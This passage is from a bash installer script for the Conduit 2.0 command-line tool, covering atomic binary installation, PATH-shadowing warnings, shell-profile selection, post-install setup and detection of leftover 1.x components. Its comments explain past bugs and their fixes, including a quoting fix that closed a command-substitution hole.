    local dest="${PREFIX}/${BINARY}"

    info "Installing to ${dest}"

    # Re-checked here as well as in preflight_prefix: install_binary is the
    # function that writes, and a guard that lives only in a caller is a guard
    # the next caller will not have.
    preflight_prefix

    # Replacing a running or previously-installed binary: write beside it and
    # rename, so an interrupted install cannot leave a truncated executable on
    # PATH. Rename is atomic within a filesystem, which is why the temp file
    # goes in PREFIX rather than /tmp.
    # Sweep staging files from earlier runs that were killed between the copy
    # and the rename. They are inert, but they are also full-size copies of the
    # binary sitting in a directory on the user's PATH, and nothing else will
    # ever clean them up.
    local stale
    for stale in "${dest}".new.*; do
        [[ -e "$stale" ]] || continue   # no match: the glob stayed literal
        rm -f -- "$stale" || true
    done

    # Recorded in the global the single EXIT trap reads, rather than installed
    # as a second trap that would replace the first. See cleanup.
    STAGED="${dest}.new.$$"

    cp -- "$src" "$STAGED" || die "could not copy the binary into ${PREFIX}"
    chmod 755 "$STAGED"

    if ! mv -f -- "$STAGED" "$dest"; then
        die "could not install to ${dest}"
    fi
    STAGED=""   # the rename consumed it; there is nothing left to clean up

    # The rename reporting success is not the same as an executable being there.
    # Verified rather than assumed, because "OK installed" over a destination
    # that holds no runnable binary is the single most misleading thing this
    # script could print.
    [[ -f "$dest" ]] || die "nothing was installed at ${dest} (the rename reported success)"
    [[ -x "$dest" ]] || die "${dest} exists but is not executable"

    success "installed ${dest}"

    warn_about_shadowing "$dest"
}

# path_index prints a directory's 1-based position in PATH, or 0 if absent.
path_index() {
    local want="$1" entry i=1
    local entries=()
    IFS=':' read -ra entries <<< "$PATH"
    for entry in ${entries[@]+"${entries[@]}"}; do
        [[ "$entry" == "$want" ]] && { printf '%s' "$i"; return 0; }
        i=$((i + 1))
    done
    printf '0'
}

# warn_about_shadowing reports another `conduit` that would win a PATH lookup.
#
# This used to fire only for a SYMLINK at /usr/local/bin/conduit, which is what
# v1 left behind. But a regular file there shadows just as completely -- a
# hand-built copy, an older release someone unpacked with sudo, a Homebrew
# install -- and the symptom is identical and mystifying: the install reports
# success and `conduit version` keeps printing the old version.
#
# PATH order decides whether a second copy actually matters, so it is consulted
# rather than assumed. A copy in a directory that comes AFTER the prefix is
# harmless and is not mentioned.
warn_about_shadowing() {
    local dest="$1"
    local mine_idx other other_idx candidate target

    mine_idx="$(path_index "$PREFIX")"

    for other in /usr/local/bin /opt/homebrew/bin /usr/bin "${HOME}/bin"; do
        [[ "$other" == "$PREFIX" ]] && continue

        candidate="${other}/${BINARY}"
        [[ -e "$candidate" || -L "$candidate" ]] || continue

        other_idx="$(path_index "$other")"
        [[ "$other_idx" -ne 0 ]] || continue   # not on PATH: cannot shadow

        # It wins if the prefix is not on PATH at all, or comes later.
        if [[ "$mine_idx" -ne 0 && "$mine_idx" -lt "$other_idx" ]]; then
            continue
        fi

        if [[ -L "$candidate" ]]; then
            target="$(readlink "$candidate")"
            [[ "$target" == "$dest" ]] && continue   # it points at what we just installed
            warn "${candidate} is a symlink to ${target}"
        else
            warn "${candidate} is another conduit binary"
        fi

        warn "  It comes earlier on your PATH than ${PREFIX}, so it wins:"
        warn "  typing 'conduit' would run it, not the binary just installed."
        warn "  Remove it with:  sudo rm ${candidate}"

        if [[ "$mine_idx" -eq 0 ]]; then
            warn "  (${PREFIX} is not on this shell's PATH yet -- see below.)"
        fi
    done
}

# ---------------------------------------------------------------------------
# PATH
# ---------------------------------------------------------------------------

# CONDUIT_PATH_MARKER introduces the PATH line this script writes.
#
# It is the ONLY thing the uninstaller matches on, so the two must stay in
# step -- and it must stay identical to the marker in uninstall.sh and
# conduitPathMarker in internal/setup/setup.go.
readonly CONDUIT_PATH_MARKER="# Conduit"

# CONDUIT_MARKER_RE is how the marker is DETECTED, as opposed to written.
#
# Detection has to use the same rule as removal, and removal has always been
# anchored: uninstall.sh matches '^[[:space:]]*# Conduit' and
# isConduitPathMarker in internal/setup/setup.go trims and checks a prefix.
# This script used to grep for the bare string anywhere in the file, so a line
# like
#
#     alias k=kubectl # Conduit helper
#
# convinced it that its own block was already present. It then wrote nothing,
# announced "PATH entry already present", and left the user with an installed
# binary that no shell could find. Anchoring makes the installer and the
# uninstaller agree on what a marker is.
readonly CONDUIT_MARKER_RE='^[[:space:]]*# Conduit'

# bash_login_profile returns the file a LOGIN bash reads on this machine.
#
# Login bash reads the first of ~/.bash_profile, ~/.bash_login and ~/.profile
# that exists, and stops there -- it does not read the rest. That "stops there"
# is why this cannot simply return ~/.bash_profile: on a machine whose user
# keeps their setup in ~/.profile, creating ~/.bash_profile would shadow the
# whole of it, and we would have broken their shell in order to add a
# directory to PATH.
#
# So the file is chosen by exactly bash's own rule, and a new ~/.bash_profile
# is only created when there is nothing there to shadow.
bash_login_profile() {
    local candidate
    for candidate in "${HOME}/.bash_profile" "${HOME}/.bash_login" "${HOME}/.profile"; do
        if [[ -f "$candidate" ]]; then
            printf '%s' "$candidate"
            return 0
        fi
    done
    printf '%s' "${HOME}/.bash_profile"
}

# profile_for_shell returns the rc file this user's shell reads at startup.
#
# For bash the answer is platform-dependent, and getting it wrong is silent.
# macOS terminals (Terminal.app, iTerm) start bash as a LOGIN shell, which
# reads ~/.bash_profile and NEVER ~/.bashrc. Linux terminals start it
# interactive-but-not-login, which reads ~/.bashrc and not ~/.bash_profile.
#
# Writing to ~/.bashrc on macOS -- which is what this did -- produced a
# successful-looking install whose PATH entry no shell the user opened ever
# read. They followed the instruction to open a new terminal, `conduit` was
# still not found, and nothing in the output pointed at the cause.
#
# fish is excluded deliberately: its syntax is not POSIX, so the block written
# below would be a syntax error rather than a PATH entry.
profile_for_shell() {
    case "$(basename "${SHELL:-sh}")" in
        zsh)  printf '%s' "${HOME}/.zshrc" ;;
        bash)
            if [[ "$OS" == "darwin" ]]; then
                bash_login_profile
            else
                printf '%s' "${HOME}/.bashrc"
            fi
            ;;
        *)    printf '' ;;
    esac
}

# add_to_path appends Conduit's PATH block to the user's shell profile.
#
# Previously this only printed the line and told the user to add it themselves.
# The result was that nothing on any machine ever carried the marker comment,
# which made the uninstaller's profile cleanup dead code: it searched for a
# signature that by construction did not exist, while the help promised to
# remove PATH entries. Either the installer writes the marker or the
# uninstaller should stop claiming to remove it; writing it is the half that
# also saves the user a manual step.
#
# The block is appended, never edited in place, and the marker is what makes it
# removable later without guessing.
add_to_path() {
    local profile
    profile="$(profile_for_shell)"

    if [[ -z "$profile" ]]; then
        warn "${PREFIX} is not on your PATH."
        case "$(basename "${SHELL:-sh}")" in
            fish) warn "  Add it with: fish_add_path ${PREFIX}" ;;
            *)    warn "  Add it with: export PATH=$(shell_quote "$PREFIX"):\"\$PATH\"" ;;
        esac
        return 0
    fi

    # Already ours? Adding a second copy would put two identical entries on
    # PATH and leave the uninstaller two blocks to remove.
    #
    # Matched with the anchored expression, not a substring search: see
    # CONDUIT_MARKER_RE.
    if [[ -f "$profile" ]] && grep -qE "$CONDUIT_MARKER_RE" "$profile" 2>/dev/null; then
        info "PATH entry already present in ${profile}"
        return 0
    fi

    info "Adding ${PREFIX} to PATH in ${profile}"

    # SINGLE-quoted, and that is the whole point of this line.
    #
    # It used to be written as
    #
    #     printf 'export PATH="%s:$PATH"\n' "$PREFIX"
    #
    # putting an unescaped prefix inside DOUBLE quotes, where the shell still
    # performs command substitution. A prefix containing $( ) or backticks
    # therefore became code that ran in every login shell from then on -- not
    # once at install time, but on every terminal the user ever opened.
    #
    # Single quotes suspend every expansion, "$PATH" stays outside them so it is
    # still expanded, and assert_prefix_safe has already refused anything that
    # would need the escaping in the first place. Both halves, because a
    # validator is one edit away from being relaxed.
    {
        printf '\n%s\n' "$CONDUIT_PATH_MARKER"
        printf 'export PATH=%s:"$PATH"\n' "$(shell_quote "$PREFIX")"
    } >> "$profile" || {
        warn "could not write to ${profile}. Add this yourself:"
        warn "    export PATH=$(shell_quote "$PREFIX"):\"\$PATH\""
        return 0
    }

    success "PATH updated in ${profile}"
    # The file is NAMED, because it varies: zsh reads ~/.zshrc, bash on macOS
    # reads ~/.bash_profile (or ~/.bash_login, or ~/.profile), bash on Linux
    # reads ~/.bashrc. Telling everyone to `source ~/.zshrc` is wrong for most
    # of them, and wrong in a way that looks like the install having failed.
    warn "Open a new shell, or run: source ${profile}"
}

check_path() {
    case ":${PATH}:" in
        *":${PREFIX}:"*) return 0 ;;
    esac
    add_to_path
}

# ---------------------------------------------------------------------------
# Post-install
# ---------------------------------------------------------------------------

# QUIET_LOGS silences the binary's structured logger for the calls this script
# makes.
#
# An installer's transcript is read by a human deciding whether the install
# worked. Interleaving zerolog JSON into it -- which is what these commands did,
# because the log level was never applied to anything -- buries the four lines
# that matter under machine output nobody here can use. `error` rather than
# `off`: a real failure still has to be visible.
readonly QUIET_LOGS=(--log-level error)

run_setup() {
    local conduit="${PREFIX}/${BINARY}"

    info "Running setup"
    # Called through the freshly installed path rather than whatever `conduit`
    # resolves to, so a stale binary elsewhere on PATH cannot configure the
    # machine on the new one's behalf.
    #
    # --skip-tools is NOT optional here. Without it, setup runs
    # `brew install poppler` -- a package manager, unattended, on a machine the
    # user only asked to have one binary copied onto. An interactive
    # `conduit setup` may still offer it; an installer may not decide it.
    if ! "$conduit" "${QUIET_LOGS[@]}" setup --client "$MCP_CLIENT" --skip-tools; then
        warn "setup reported problems; the binary is installed and usable."
        warn "  Re-run it with: ${conduit} setup"
        return 0
    fi

    # Said once, only when it is true, because --skip-tools means this script
    # will not install it and the user should know what they are missing.
    if ! have pdftotext; then
        printf '%s\n' "  Note: PDF text extraction needs pdftotext, which is not installed."
        printf '%s\n' "        macOS: brew install poppler    Linux: apt install poppler-utils"
    fi
}

download_model() {
    local conduit="${PREFIX}/${BINARY}"

    info "Downloading the embedding model"
    if ! "$conduit" "${QUIET_LOGS[@]}" model download; then
        warn "model download failed. Conduit still works with keyword search."
        warn "  Retry with: ${conduit} model download"
    fi
}

print_doctor() {
    local conduit="${PREFIX}/${BINARY}"

    info "Diagnostics"
    # doctor exits non-zero when a check fails, which is expected on a fresh
    # install with no documents indexed. Its output is the point, not its code.
    "$conduit" "${QUIET_LOGS[@]}" doctor || true
}

# V1 DETECTION -- kept in step with scripts/remove-v1.sh.
#
# These lists are a deliberate inline copy of V1_LAUNCHD_LABELS,
# V1_SYSTEMD_UNITS, the daemon binary paths and V1_CONTAINERS in remove-v1.sh.
# They are not sourced from it because this script has to work piped from curl,
# where there is no remove-v1.sh on the machine to source.
#
# CHANGE ONE, CHANGE THE OTHER. The previous copy had drifted: it knew about
# conduit.service but not conduit-daemon.service, about ~/.local/bin but none of
# the other three daemon locations, and about no containers at all -- so a
# machine whose only v1 remnant was a pair of running Qdrant and FalkorDB
# containers holding ports 6333/6334/6379 was told it was clean.
readonly V1_LAUNCHD_LABELS=(dev.simpleflo.conduit com.simpleflo.conduit)
readonly V1_SYSTEMD_UNITS=(conduit.service conduit-daemon.service)
readonly V1_DAEMON_PATHS=(
    "${HOME}/.local/bin/conduit-daemon"
    "${HOME}/bin/conduit-daemon"
    "/usr/local/bin/conduit-daemon"
    "/opt/homebrew/bin/conduit-daemon"
)
readonly V1_CONTAINERS=(conduit-qdrant conduit-falkordb)

# v1_containers_present reports whether any v1 container still exists.
#
# The runtime is probed for LIVENESS first. `docker ps` against a stopped Docker
# Desktop blocks for its connect timeout, and an installer must not hang for
# thirty seconds on a check whose only output is a warning.
v1_containers_present() {
    local runtime name
    for runtime in docker podman; do
        have "$runtime" || continue
        "$runtime" info >/dev/null 2>&1 || continue   # installed but not running

        for name in "${V1_CONTAINERS[@]}"; do
            if "$runtime" ps -a --filter "name=^${name}$" --format '{{.Names}}' 2>/dev/null \
               | grep -q .; then
                return 0
            fi
        done
    done
    return 1
}

warn_about_v1() {
    local found=() label unit path

    for label in "${V1_LAUNCHD_LABELS[@]}"; do
        [[ -e "${HOME}/Library/LaunchAgents/${label}.plist" ]] && \
            found+=("launchd agent ${label}")
    done

    for unit in "${V1_SYSTEMD_UNITS[@]}"; do
        [[ -e "${HOME}/.config/systemd/user/${unit}" ]] && found+=("systemd unit ${unit}")
    done

    for path in "${V1_DAEMON_PATHS[@]}"; do
        [[ -e "$path" ]] && found+=("daemon binary ${path}")
    done

    if v1_containers_present; then
        found+=("containers: ${V1_CONTAINERS[*]} (holding ports 6333, 6334, 6379)")
    fi

    [[ ${#found[@]} -gt 0 ]] || return 0

    printf '\n'
    warn "This machine still has Conduit 1.x components installed:"
    local item
    for item in "${found[@]}"; do
        warn "    ${item}"
    done
    warn "  Conduit 2.0 does not use any of them, and they will keep starting"
    warn "  at login -- and holding those ports -- until removed."
    warn ""
    warn "  Remove them with:"
    while IFS= read -r item; do
        warn "$item"
    done <<< "$(remove_v1_hint)"
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

main() {
    printf '%s\n' "${C_BOLD}Conduit 2.0 installer${C_RESET}"
    printf '%s\n\n' "One binary. No daemon, no containers, no background service."

    detect_platform
    info "Platform: ${OS} ${ARCH}"

    # Before the network. Discovering that the destination cannot be written to
    # is worth a second at the start rather than 13 MB and a verified checksum
    # in.
    preflight_prefix

    if [[ "$FROM_SOURCE" == true ]]; then
        install_from_source
    else
        install_from_release
    fi

    check_path

    # `conduit setup` prints its own diagnostics AND its own next steps.
    #
    # This script used to run a full `conduit doctor` immediately afterwards and
    # then print a second copy of the next steps, so an ordinary install ended
    # with the same checks reported twice and the same three commands listed
    # twice. Each half is printed by exactly one of the two now: setup when it
    # runs, this script when it does not.
    if [[ "$RUN_SETUP" == true ]]; then
        run_setup
    else
        info "Skipping setup (--no-setup)"
    fi

    if [[ "$DOWNLOAD_MODEL" == true ]]; then
        download_model
    fi

    if [[ "$RUN_SETUP" != true ]]; then
        # Nothing else has reported on this machine, so the diagnostics are
        # this run's only evidence that the binary works.
        print_doctor
    fi

    warn_about_v1

    printf '\n%s\n' "${C_BOLD}Done.${C_RESET}"
    if [[ "$RUN_SETUP" != true ]]; then
        printf '%s\n' "  ${BINARY} setup                # configure an AI client"
        printf '%s\n' "  ${BINARY} kb add <folder>      # index a folder"
        printf '%s\n' "  ${BINARY} kb sync              # build the index"
        printf '%s\n' "  ${BINARY} kb search \"query\"     # check it works"
        if [[ "$DOWNLOAD_MODEL" != true ]]; then
            printf '%s\n' "  ${BINARY} model download      # enable semantic search"
        fi
    fi
}

main "$@"
